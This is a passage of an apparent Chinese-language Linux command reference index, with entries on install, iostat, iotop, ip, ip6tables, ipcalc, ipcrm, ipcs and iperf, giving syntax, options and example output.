实例\n\n```shell\ninstall -d [option] DIRECTORY [DIRECTORY...]\n```\n\n支持多个，类似`mkdir -p`支持递归。例如：`install -d a/b/c e/f`结果和`mkdir -p a/b/c e/f`一样。\n\n```shell\ninstall [option] SOURCE DEST\n```\n\n **复制SOURCE文件（测试不能是目录）到DEST file（文件）：** \n\n```shell\ninstall a/e c\n结果类似：\ncp a/e c    #注意c必须是文件。\n```\n\n **有用选项`-D`：** \n\n```shell\ninstall -D x a/b/c\n效果类似：\nmkdir -p a/b && cp x a/b/c\n```\n\n```shell\ninstall [option] SOURCE [SOURCE...] DIRECTORY\n```\n\n **复制多个SOURCE文件到目的目录：** \n\n```shell\ninstall a/* d\n```\n\n其中d是目录。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","install"]},{"title":"【Linux 命令】iostat","url":"/linux-command/iostat/","content":"\n监视系统输入输出设备和CPU的使用情况\n\n## 补充说明\n\n**iostat命令** 被用于监视系统输入输出设备和CPU的使用情况。它的特点是汇报磁盘活动统计情况，同时也会汇报出CPU使用情况。同vmstat一样，iostat也有一个弱点，就是它不能对某个进程进行深入分析，仅对系统的整体情况进行分析。\n\n###  语法\n\n```shell\niostat(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：仅显示CPU使用情况；\n-d：仅显示设备利用率；\n-k：显示状态以千字节每秒为单位，而不使用块每秒；\n-m：显示状态以兆字节每秒为单位；\n-p：仅显示块设备和所有被使用的其他分区的状态；\n-t：显示每个报告产生时的时间；\n-V：显示版号并退出；\n-x：显示扩展状态。\n```\n\n###  参数\n\n*   间隔时间：每次报告的间隔时间（秒）；\n*   次数：显示报告的次数。\n\n###  实例\n\n用`iostat -x /dev/sda1`来观看磁盘I/O的详细情况：\n\n```shell\niostat -x /dev/sda1 \nLinux 2.6.18-164.el5xen (localhost.localdomain)\n2010年03月26日  \n\navg-cpu:  %user   %nice %system %iowait \n%steal   %idle  \n            0.11    0.02    0.18    0.35   \n0.03    99.31  \n\nDevice:         tps   Blk_read/s    Blk_wrtn/s  \nBlk_read   Blk_wrtn  \nsda1                0.02          0.08       \n0.00          2014               4 \n```\n\n详细说明：第二行是系统信息和监测时间，第三行和第四行显示CPU使用情况（具体内容和mpstat命令相同）。这里主要关注后面I/O输出的信息，如下所示：\n\n\n标示 | 说明\n--- | ---\nDevice | 监测设备名称\nrrqm/s | 每秒需要读取需求的数量\nwrqm/s | 每秒需要写入需求的数量\nr/s | 每秒实际读取需求的数量\nw/s | 每秒实际写入需求的数量\nrsec/s | 每秒读取区段的数量\nwsec/s | 每秒写入区段的数量\nrkB/s | 每秒实际读取的大小，单位为KB\nwkB/s | 每秒实际写入的大小，单位为KB\navgrq-sz | 需求的平均大小区段\navgqu-sz | 需求的平均队列长度\nawait | 等待I/O平均的时间（milliseconds）\nsvctm | I/O需求完成的平均时间\n%util | 被I/O需求消耗的CPU百分比\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iostat"]},{"title":"【Linux 命令】iotop","url":"/linux-command/iotop/","content":"\n用来监视磁盘I/O使用状况的工具\n\n## 补充说明\n\n**iotop命令** 是一个用来监视磁盘I/O使用状况的top类工具。iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。\n\niotop使用Python语言编写而成，要求Python2.5（及以上版本）和Linux kernel2.6.20（及以上版本）。iotop提供有源代码及rpm包，可从其官方主页下载。\n\n###  安装\n\n **Ubuntu** \n\n```shell\napt-get install iotop\n```\n\n **CentOS** \n\n```shell\nyum install iotop\n```\n\n **编译安装** \n\n```shell\nwget http://guichaz.free.fr/iotop/files/iotop-0.4.4.tar.gz    \ntar zxf iotop-0.4.4.tar.gz    \npython setup.py build    \npython setup.py install\n```\n\n###  语法\n\n```shell\niotop（选项）\n```\n\n###  选项\n\n```shell\n-o：只显示有io操作的进程\n-b：批量显示，无交互，主要用作记录到文件。\n-n NUM：显示NUM次，主要用于非交互式模式。\n-d SEC：间隔SEC秒显示一次。\n-p PID：监控的进程pid。\n-u USER：监控的进程用户。\n```\n\n **iotop常用快捷键：** \n\n1.  左右箭头：改变排序方式，默认是按IO排序。\n2.  r：改变排序顺序。\n3.  o：只显示有IO输出的进程。\n4.  p：进程/线程的显示方式的切换。\n5.  a：显示累积使用量。\n6.  q：退出。\n\n###  实例\n\n直接执行iotop就可以看到效果了：\n\n```shell\nTotal DISK read:       0.00 B/s | Total DISK write:       0.00 B/s\n  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO>    command\n    1 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % init [3]\n    2 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [kthreadd]\n    3 rt/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [migration/0]\n    4 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [ksoftirqd/0]\n    5 rt/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [watchdog/0]\n    6 rt/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [migration/1]\n    7 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [ksoftirqd/1]\n    8 rt/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [watchdog/1]\n    9 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [events/0]\n   10 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [events/1]\n   11 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [khelper]\n2572 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [bluetooth]\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iotop"]},{"title":"【Linux 命令】ip","url":"/linux-command/ip/","content":"\n网络配置工具\n\n## 补充说明\n\n**ip命令** 用来显示或操纵Linux主机的路由、网络设备、策略路由和隧道，是Linux下较新的功能强大的网络配置工具。\n\n###  语法 \n\n```shell\nip(选项)(参数)\nUsage: ip [ OPTIONS ] OBJECT { COMMAND | help }\n       ip [ -force ] -batch filename\n```\n\n###  选项 \n\n```shell\nOBJECT := { link | address | addrlabel | route | rule | neigh | ntable |\n       tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm |\n       netns | l2tp | macsec | tcp_metrics | token }\n       \n-V：显示指令版本信息；\n-s：输出更详细的信息；\n-f：强制使用指定的协议族；\n-4：指定使用的网络层协议是IPv4协议；\n-6：指定使用的网络层协议是IPv6协议；\n-0：输出信息每条记录输出一行，即使内容较多也不换行显示；\n-r：显示主机时，不使用IP地址，而使用主机的域名。\n```\n\n###  参数 \n\n```shell\nOPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |\n        -h[uman-readable] | -iec |\n        -f[amily] { inet | inet6 | ipx | dnet | bridge | link } |\n        -4 | -6 | -I | -D | -B | -0 |\n        -l[oops] { maximum-addr-flush-attempts } |\n        -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |\n        -rc[vbuf] [size] | -n[etns] name | -a[ll] }\n        \n网络对象：指定要管理的网络对象；\n具体操作：对指定的网络对象完成具体操作；\nhelp：显示网络对象支持的操作命令的帮助信息。\n```\n\n###  实例 \n\n```shell\nip link show                     # 显示网络接口信息\nip link set eth0 up             # 开启网卡\nip link set eth0 down            # 关闭网卡\nip link set eth0 promisc on      # 开启网卡的混合模式\nip link set eth0 promisc offi    # 关闭网卡的混个模式\nip link set eth0 txqueuelen 1200 # 设置网卡队列长度\nip link set eth0 mtu 1400        # 设置网卡最大传输单元\nip addr show     # 显示网卡IP信息\nip addr add 192.168.0.1/24 dev eth0 # 设置eth0网卡IP地址192.168.0.1\nip addr del 192.168.0.1/24 dev eth0 # 删除eth0网卡IP地址\n\nip route show # 显示系统路由\nip route add default via 192.168.1.254   # 设置系统默认路由\nip route list                 # 查看路由信息\nip route add 192.168.4.0/24  via  192.168.0.254 dev eth0 # 设置192.168.4.0网段的网关为192.168.0.254,数据走eth0接口\nip route add default via  192.168.0.254  dev eth0        # 设置默认网关为192.168.0.254\nip route del 192.168.4.0/24   # 删除192.168.4.0网段的网关\nip route del default          # 删除默认路由\nip route delete 192.168.1.0/24 dev eth0 # 删除路由\n```\n\n**用ip命令显示网络设备的运行状态** \n\n```shell\n[root@localhost ~]# ip link list\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff\n```\n\n**显示更加详细的设备信息** \n\n```shell\n[root@localhost ~]# ip -s link list\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    RX: bytes  packets  errors  dropped overrun mcast   \n    5082831    56145    0       0       0       0      \n    TX: bytes  packets  errors  dropped carrier collsns\n    5082831    56145    0       0       0       0      \n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff\n    RX: bytes  packets  errors  dropped overrun mcast   \n    3641655380 62027099 0       0       0       0      \n    TX: bytes  packets  errors  dropped carrier collsns\n    6155236    89160    0       0       0       0      \n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff\n    RX: bytes  packets  errors  dropped overrun mcast   \n    2562136822 488237847 0       0       0       0      \n    TX: bytes  packets  errors  dropped carrier collsns\n    3486617396 9691081  0       0       0       0     \n```\n\n**显示核心路由表** \n\n```shell\n[root@localhost ~]# ip route list \n112.124.12.0/22 dev eth1  proto kernel  scope link  src 112.124.15.130\n10.160.0.0/20 dev eth0  proto kernel  scope link  src 10.160.7.81\n192.168.0.0/16 via 10.160.15.247 dev eth0\n172.16.0.0/12 via 10.160.15.247 dev eth0\n10.0.0.0/8 via 10.160.15.247 dev eth0\ndefault via 112.124.15.247 dev eth1\n```\n\n**显示邻居表** \n\n```shell\n[root@localhost ~]# ip neigh list\n112.124.15.247 dev eth1 lladdr 00:00:0c:9f:f3:88 REACHABLE\n10.160.15.247 dev eth0 lladdr 00:00:0c:9f:f2:c0 STALE\n```\n\n**获取主机所有网络接口**\n\n```shell\nip link | grep -E '^[0-9]' | awk -F: '{print $2}'\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ip"]},{"title":"【Linux 命令】ip6tables-restore","url":"/linux-command/ip6tables-restore/","content":"\n还原ip6tables表\n\n## 补充说明\n\n**ip6tables-restore命令** 用来还原ip6tables表。\n\n###  语法\n\n```shell\nip6tables-restore(选项)\n```\n\n###  选项\n\n```shell\n-c：指定在还原iptables表时，还原当前的数据包计数器和字节计数器值；\n-t：指定要还原的表的名称。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ip6tables-restore"]},{"title":"【Linux 命令】ip6tables-save","url":"/linux-command/ip6tables-save/","content":"\n保存ip6tables表配置\n\n## 补充说明\n\n**ip6tables-save命令** 将Linux内核中ip6tables表导出到标准输出设备上。\n\n###  语法\n\n```shell\nip6tables-save(选项)\n```\n\n###  选项\n\n```shell\n-c：指定在保存iptables表时，保存当前的数据包计数器和字节计数器值；\n-t：指定要保存的表的名称。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ip6tables-save"]},{"title":"【Linux 命令】ip6tables","url":"/linux-command/ip6tables/","content":"\nlinux中防火墙软件\n\n## 补充说明\n\n**ip6tables命令** 和iptables一样，都是linux中防火墙软件，不同的是ip6tables采用的TCP/ip协议为IPv6。\n\n###  语法\n\n```shell\nip6tables(选项)\n```\n\n###  选项\n\n```shell\n-t<表>：指定要操纵的表；\n-A：向规则链中添加条目；\n-D：从规则链中删除条目；\n-i：向规则链中插入条目；\n-R：替换规则链中的条目；\n-L：显示规则链中已有的条目；\n-F：清楚规则链中已有的条目；\n-Z：清空规则链中的数据包计算器和字节计数器；\n-N：创建新的用户自定义规则链；\n-P：定义规则链中的默认目标；\n-h：显示帮助信息；\n-p：指定要匹配的数据包协议类型；\n-s：指定要匹配的数据包源ip地址；\n-j<目标>：指定要跳转的目标；\n-i<网络接口>：指定数据包进入本机的网络接口；\n-o<网络接口>：指定数据包要离开本机所使用的网络接口。\n-c<计数器>：在执行插入操作（insert），追加操作（append），替换操作（replace）时初始化包计数器和字节计数器。\n```\n\n###  实例\n\n在命令行窗口输入下面的指令就可以查看当前的 IPv6 防火墙配置：\n\n```shell\nip6tables -nl --line-numbers\n```\n\n **/etc/sysconfig/ip6tables文件** \n\n使用编辑器编辑`/etc/sysconfig/ip6tables`文件：\n\n```shell\nvi /etc/sysconfig/ip6tables\n```\n\n可能会看到下面的默认 ip6tables 规则：\n\n```shell\n*filter\n:INPUT accept [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n:RH-Firewall-1-INPUT - [0:0]\n-A INPUT -j RH-Firewall-1-INPUT\n-A FORWARD -j RH-Firewall-1-INPUT\n-A RH-Firewall-1-INPUT -i lo -j ACCEPT\n-A RH-Firewall-1-INPUT -p icmpv6 -j ACCEPT\n-A RH-Firewall-1-INPUT -p 50 -j ACCEPT\n-A RH-Firewall-1-INPUT -p 51 -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp --dport 5353 -d ff02::fb -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp -m udp --dport 32768:61000 -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 32768:61000 ! --syn -j ACCEPT\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 22 -j ACCEPT\n-A RH-Firewall-1-INPUT -j reject --reject-with icmp6-adm-prohibited\nCOMMIT\n```\n\n与 IPv4 的 iptables 规则类似，但又不完全相同。\n\n要开启 80 端口（HTTP 服务器端口），在 COMMIT 一行之前添加如下规则：\n\n```shell\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 80 -j ACCEPT\n```\n\n`-p tcp`表示仅针对 tcp 协议的通信。`--dport`指定端口号。\n\n要开启 53 端口（DNS 服务器端口），在 COMMIT 一行之前添加如下规则：\n\n```shell\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 53 -j ACCEPT\n-A RH-Firewall-1-INPUT -m udp -p tcp --dport 53 -j ACCEPT\n```\n\n同时针对 tcp 和 udp 协议开启 53 端口。\n\n要开启 443 端口，在 COMMIT 一行之前添加如下规则：\n\n```shell\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 443 -j ACCEPT\n```\n\n要开启 25 端口（SMTP 邮件服务器端口），在 COMMIT 一行之前添加如下规则：\n\n```shell\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 25 -j ACCEPT\n```\n\n对于那些没有特定规则与之匹配的数据包，可能是我们不想要的，多半是有问题的。我们可能也希望在丢弃（DROP）之前记录它们。此时，可以将最后一行：\n\n```shell\n-A RH-Firewall-1-INPUT -j REJECT --reject-with icmp6-adm-prohibited\nCOMMIT\n```\n\n改为：\n\n```shell\n-A RH-Firewall-1-INPUT -j LOG\n-A RH-Firewall-1-INPUT -j DROP\nCOMMIT\n```\n\n保存并关闭该文件。然后重新启动 ip6tables 防火墙：\n\n```shell\n# service ip6tables restart\n```\n\n然后重新查看 ip6tables 规则，可以看到如下所示的输出：\n\n```shell\n# ip6tables -vnL --line-numbers\n```\n\n输出示例：\n\n```shell\nChain INPUT (policy ACCEPT 0 packets, 0 bytes)\nnum   pkts bytes target     prot opt in     out     source               destination\n1    42237 3243K RH-Firewall-1-INPUT  all      *      *       ::/0                 ::/0\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\nnum   pkts bytes target     prot opt in     out     source               destination\n1        0     0 RH-Firewall-1-INPUT  all      *      *       ::/0                 ::/0\nChain OUTPUT (policy ACCEPT 12557 packets, 2042K bytes)\nnum   pkts bytes target     prot opt in     out     source               destination\nChain RH-Firewall-1-INPUT (2 references)\nnum   pkts bytes target     prot opt in     out     source               destination\n1        6   656 ACCEPT     all      lo     *       ::/0                 ::/0\n2    37519 2730K ACCEPT     icmpv6    *      *       ::/0                 ::/0\n3        0     0 ACCEPT     esp      *      *       ::/0                 ::/0\n4        0     0 ACCEPT     ah       *      *       ::/0                 ::/0\n5      413 48385 ACCEPT     udp      *      *       ::/0                 ff02::fb/128       udp dpt:5353\n6        0     0 ACCEPT     udp      *      *       ::/0                 ::/0               udp dpt:631\n7        0     0 ACCEPT     tcp      *      *       ::/0                 ::/0               tcp dpt:631\n8      173 79521 ACCEPT     udp      *      *       ::/0                 ::/0               udp dpts:32768:61000\n9        0     0 ACCEPT     tcp      *      *       ::/0                 ::/0               tcp dpts:32768:61000 flags:!0x16/0x02\n10       0     0 ACCEPT     tcp      *      *       ::/0                 ::/0               tcp dpt:22\n11       0     0 ACCEPT     tcp      *      *       ::/0                 ::/0               tcp dpt:80\n12       0     0 ACCEPT     tcp      *      *       ::/0                 ::/0               tcp dpt:53\n13    4108  380K ACCEPT     udp      *      *       ::/0                 ::/0               udp dpt:53\n14      18  4196 REJECT     all      *      *       ::/0                 ::/0\n```\n\n **IPv6 私有 IP** \n\nIPv4 通常默认即可保护内部局域网私有 IP 上的主机。但是 IPv6 的地址非常丰富，不再需要使用类似 NAT 等协议的私有网络。这样一来，所有的内部主机都可以拥有公网 IP 而直接连接到互联网，也就同时暴露于互联网上的各种威胁之中了。那么，如何配置 IPv6 防火墙使其默认将除了 ping6 请求之外的所有输入数据包都丢弃呢？可以使用FC00::/7 前缀来标识本地 IPv6 单播地址。\n\n **允许特定的 ICMPv6 通信** \n\n使用 IPv6 的时候需要允许比 IPv4 更多类型的 ICMP 通信以保证路由和 IP 地址自动配置等功能正常工作。有时候，如果你的规则设置太过苛刻，可能都无法分配到正确的 IPv6 地址。当然，不使用 DHCP 而是手动配置 IP 地址的除外。\n\n下面是一些比较常见的 ipv6-icmp 配置实例：\n\n```shell\n:ICMPv6 - [0:0]\n# Approve certain ICMPv6 types and all outgoing ICMPv6\n# http://forum.linode.com/viewtopic.php?p=39840#39840\n-A INPUT -p icmpv6 -j ICMPv6\n-A ICMPv6 -p icmpv6 --icmpv6-type echo-request -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type destination-unreachable -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type packet-too-big -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type time-exceeded -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type parameter-problem -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type router-solicitation -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type router-advertisement -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type neighbour-solicitation -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type neighbour-advertisement -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type redirect -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 141 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 142 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 148 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 149 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 130 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 131 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 132 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 143 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 151 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 152 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 153 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -j RETURN\n-A OUTPUT -p icmpv6 -j ACCEPT\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ip6tables"]},{"title":"【Linux 命令】ipcalc","url":"/linux-command/ipcalc/","content":"\n简单的IP地址计算器\n\n## 补充说明\n\n**ipcalc命令** 是一个简单的ip地址计算器，可以完成简单的IP地址计算任务。\n\n###  语法\n\n```shell\nipcalc(选项)\n```\n\n###  选项\n\n```shell\n-b：由给定的IP地址和网络掩码计算出广播地址；\n-h：显示给定UP地址所对应的主机名；\n-m：由给定的IP地址计算器网络掩码；\n-p：显示给定的掩码或IP地址的前缀；\n-n：由给定的IP地址和网络掩码计算网络地址；\n-s：安静模式；\n--help：显示帮助信息。\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# ipcalc -p 192.168.2.1 255.255.255.0\nPREFIX=24\n\n[root@localhost ~]# ipcalc -n 192.168.2.1 255.255.255.0\nNETWORK=192.168.2.0\n\n[root@localhost ~]# ipcalc -h 127.0.0.1\nhostname=localhost.localdomain\n\n[root@localhost ~]# ipcalc -m 192.168.2.1\nNETMASK=255.255.255.0\n\n[root@localhost ~]# ipcalc -pnbm 192.168.2.1 255.255.255.0\nNETMASK=255.255.255.0\nPREFIX=24\nBROADCAST=192.168.2.255\nNETWORK=192.168.2.0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ipcalc"]},{"title":"【Linux 命令】ipcrm","url":"/linux-command/ipcrm/","content":"\n删除消息队列、信号集、或者共享内存标识\n\n## 补充说明\n\n**ipcrm命令** 用来删除一个或更多的消息队列、信号量集或者共享内存标识。\n\n###  语法\n\n```shell\nipcrm [ -m SharedMemoryID ] [ -M SharedMemoryKey ] [ -q MessageID ] [ -Q MessageKey ] [ -s SemaphoreID ] [ -S SemaphoreKey ]\n```\n\n###  选项\n\n```shell\n-m SharedMemory id 删除共享内存标识 SharedMemoryID。与 SharedMemoryID 有关联的共享内存段以及数据结构都会在最后一次拆离操作后删除。\n-M SharedMemoryKey 删除用关键字 SharedMemoryKey 创建的共享内存标识。与其相关的共享内存段和数据结构段都将在最后一次拆离操作后删除。\n-q MessageID 删除消息队列标识 MessageID 和与其相关的消息队列和数据结构。\n-Q MessageKey 删除由关键字 MessageKey 创建的消息队列标识和与其相关的消息队列和数据结构。\n-s SemaphoreID 删除信号量标识 SemaphoreID 和与其相关的信号量集及数据结构。\n-S SemaphoreKey 删除由关键字 SemaphoreKey 创建的信号标识和与其相关的信号量集和数据结构。\n```\n\nmsgctl、shmctl 和 semctl 子例程提供了删除操作的细节。标识和关键字可以用 ipcs 命令找到。\n\n###  示例\n\n如果要删除和 SharedMemoryID 18602 相关的共享内存段，请输入：\n\n```shell\nipcrm -m 18602\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ipcrm"]},{"title":"【Linux 命令】ipcs","url":"/linux-command/ipcs/","content":"\n分析消息队列共享内存和信号量\n\n## 补充说明\n\n**ipcs命令** 用于报告Linux中进程间通信设施的状态，显示的信息包括消息列表、共享内存和信号量的信息。\n\n###  语法\n\n```shell\nipcs(选项)\n```\n\n###  选项\n\n#### 资源选项\n\n```shell\n-a, --all         显示全部(默认值)\n-q, --queues      消息队列\n-m, --shmems      共享内存\n-s, --semaphores  信号量\n```\n\n#### 输出选项\n\n```shell\n-t, --time        显示最后一次操作时间\n-p, --pid         显示创建者和最后一次操作者的PID\n-c, --creator     显示创建者和拥有者的 userid, groupid\n-l, --limits      显示对资源的限制\n-u, --summary     显示当前状态摘要\n--human           以友好的方式显示大小(eg: 500K)\n-b, --bytes       以字节为单位显示大小(仅影响`-l`选项)\n```\n\n#### 通用选项\n\n```shell\n-i, --id <id>   显示指定ID的资源\n-h, --help      显示帮助文档并退出\n-V, --version   显示版本信息并退出\n```\n\n###  实例\n\n```shell\nipcs -a\n------ Shared Memory Segments --------\nkey        shmid      owner      perms      bytes      nattch     status\n0x7401833d 2654208    root      600        4          0\n0x00000000 3145729    root      600        4194304    9          dest\n0x7401833c 2621442    root      600        4          0\n0xd201012b 3080195    root      600        1720       2\n```\n\n### 相关命令\n\n* `ipcrm`: 删除 IPC 资源\n* `ipcmk`: 创建 IPC 资源\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ipcs"]},{"title":"【Linux 命令】iperf","url":"/linux-command/iperf/","content":"\n网络性能测试工具\n\n## 补充说明\n\n**iperf命令** 是一个网络性能测试工具。iperf可以测试TCP和UDP带宽质量。iperf可以测量最大TCP带宽，具有多种参数和UDP特性。iperf可以报告带宽，延迟抖动和数据包丢失。利用iperf这一特性，可以用来测试一些网络设备如路由器，防火墙，交换机等的性能。\n\niperf分为两种版本，Unix/Linux版和Windows版，Unix/Linux版更新比较快，版本最新。Windows版更新慢。Windows版的iperf叫jperf，或者xjperf。jperf是在iperf基础上开发了更好的UI和新的功能。\n\nLinux版本下载地址：http://code.google.com/p/iperf/downloads/list\n\n### 安装iperf\n\n对于windows版的iperf，直接将解压出来的iperf.exe和cygwin1.dll复制到%systemroot%目录即可，对于linux版的iperf，请使用如下命令安装：\n\n```shell\ngunzip -c iperf-<version>.tar.gz | tar -xvf -\ncd iperf-<version>\n./configure\nmake\nmake install\n```\n\n### 选项\n\n<table>\n<tbody>\n<tr>\n<th>命令行选项</th>\n<th>描述</th>\n</tr>\n<tr>\n<td>客户端与服务器共用选项</td>\n</tr>\n<tr>\n<td>-f, --format [bkmaBKMA]</td>\n<td>格式化带宽数输出。支持的格式有：  \n'b' = bits/sec 'B' = Bytes/sec  \n'k' = Kbits/sec 'K' = KBytes/sec  \n'm' = Mbits/sec 'M' = MBytes/sec  \n'g' = Gbits/sec 'G' = GBytes/sec  \n'a' = adaptive bits/sec 'A' = adaptive Bytes/sec  \n自适应格式是kilo-和mega-二者之一。除了带宽之外的字段都输出为字节，除非指定输出的格式，默认的参数是a。  \n注意：在计算字节byte时，Kilo = 1024， Mega = 1024^2，Giga = 1024^3。通常，在网络中，Kilo = 1000， Mega = 1000^2， and Giga = 1000^3，所以，Iperf也按此来计算比特（位）。如果这些困扰了你，那么请使用-f b参数，然后亲自计算一下。</td>\n</tr>\n<tr>\n<td>-i, --interval #</td>\n<td>设置每次报告之间的时间间隔，单位为秒。如果设置为非零值，就会按照此时间间隔输出测试报告。默认值为零。</td>\n</tr>\n<tr>\n<td>-l, --len #[KM]</td>\n<td>设置读写缓冲区的长度。TCP方式默认为8KB，UDP方式默认为1470字节。</td>\n</tr>\n<tr>\n<td>-m, --print_mss</td>\n<td>输出TCP MSS值（通过TCP_MAXSEG支持）。MSS值一般比MTU值小40字节。通常情况</td>\n</tr>\n<tr>\n<td>-p, --port #</td>\n<td>设置端口，与服务器端的监听端口一致。默认是5001端口，与ttcp的一样。</td>\n</tr>\n<tr>\n<td>-u, --udp</td>\n<td>使用UDP方式而不是TCP方式。参看-b选项。</td>\n</tr>\n<tr>\n<td>-w, --window #[KM]</td>\n<td>设置套接字缓冲区为指定大小。对于TCP方式，此设置为TCP窗口大小。对于UDP方式，此设置为接受UDP数据包的缓冲区大小，限制可以接受数据包的最大值。</td>\n</tr>\n<tr>\n<td>-B, --bind host</td>\n<td>绑定到主机的多个地址中的一个。对于客户端来说，这个参数设置了出栈接口。对于服务器端来说，这个参数设置入栈接口。这个参数只用于具有多网络接口的主机。在Iperf的UDP模式下，此参数用于绑定和加入一个多播组。使用范围在224.0.0.0至239.255.255.255的多播地址。参考-T参数。</td>\n</tr>\n<tr>\n<td>-C, --compatibility</td>\n<td>与低版本的Iperf使用时，可以使用兼容模式。不需要两端同时使用兼容模式，但是强烈推荐两端同时使用兼容模式。某些情况下，使用某些数据流可以引起1.7版本的服务器端崩溃或引起非预期的连接尝试。</td>\n</tr>\n<tr>\n<td>-M, --mss #ip头减去40字节。在以太网中，MSS值 为1460字节（MTU1500字节）。许多操作系统不支持此选项。</td>\n</tr>\n<tr>\n<td>-N, --nodelay</td>\n<td>设置TCP无延迟选项，禁用Nagle's运算法则。通常情况此选项对于交互程序，例如telnet，是禁用的。</td>\n</tr>\n<tr>\n<td>-V (from v1.6 or higher)</td>\n<td>绑定一个IPv6地址。  \n服务端：$ iperf -s –V  \n客户端：$ iperf -c <Server IPv6 Address> -V  \n注意：在1.6.3或更高版本中，指定IPv6地址不需要使用-B参数绑定，在1.6之前的版本则需要。在大多数操作系统中，将响应IPv4客户端映射的IPv4地址。</td>\n</tr>\n<tr>\n<td>服务器端专用选项</td>\n</tr>\n<tr>\n<td>-s, --server</td>\n<td>Iperf服务器模式</td>\n</tr>\n<tr>\n<td>-D 